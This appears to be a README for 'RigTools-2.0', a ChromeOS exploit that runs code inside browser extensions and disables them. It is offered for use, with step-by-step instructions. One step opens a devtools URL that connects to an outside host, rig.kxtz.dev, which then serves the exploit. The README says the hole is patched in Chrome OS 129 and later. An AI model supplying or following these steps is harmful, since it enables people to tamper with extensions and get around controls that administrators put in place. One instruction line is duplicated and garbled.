# RigTools-2.0
**Rigtools** is an exploit that allows users to run code on extensions, disable extensions, and basically do whatever they want with an extension as long as it has the correct permissions. As of October 2024, it is **patched** in Chrome OS 129 and above.

### How do you use it?

1. Open this link and just leave it alone. (Note: This will not run code it's just there to fix the second page.)
```md
devtools://devtools/bundled/devtools_app.html
```
2. Open this link and go to Network.2. Open this link and go to Network

```md
devtools://devtools/bundled/devtools_app.html?experiments=true&ws=rig.kxtz.dev/
```
3. Double-Click the black/grey box:
![image](https://github.com/user-attachments/assets/08996bac-ebc1-4526-973d-ea766731cc9e)
![image](https://github.com/user-attachments/assets/f9ae4b07-d3f3-4318-9d63-404b9142e4f0)

4. Click extension-ID and find your extension-ID.
5. Paste in the extension ID and it should load a filesystem: page. You may have other extensions under it, you can disable those too.
